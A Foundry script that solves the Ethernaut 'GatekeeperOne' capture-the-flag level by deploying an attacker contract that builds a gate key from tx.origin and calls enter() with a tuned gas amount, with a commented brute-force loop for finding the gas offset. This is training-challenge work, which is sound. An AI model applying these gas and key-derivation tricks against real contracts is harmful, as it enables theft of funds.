// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/13_GatekeeperOne.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(your_challenge_address);    
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne public level13;

    constructor(address _target) {
        level13 = GatekeeperOne(_target);
    }
    
    function attack() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        /* local test
        for (uint256 i = 0; i < 8191; i++) { 
            (bool result,) = address(level13).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (result) {
                console.log(i);
                break;
            }
        }
        */
        address(level13).call{gas:256 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}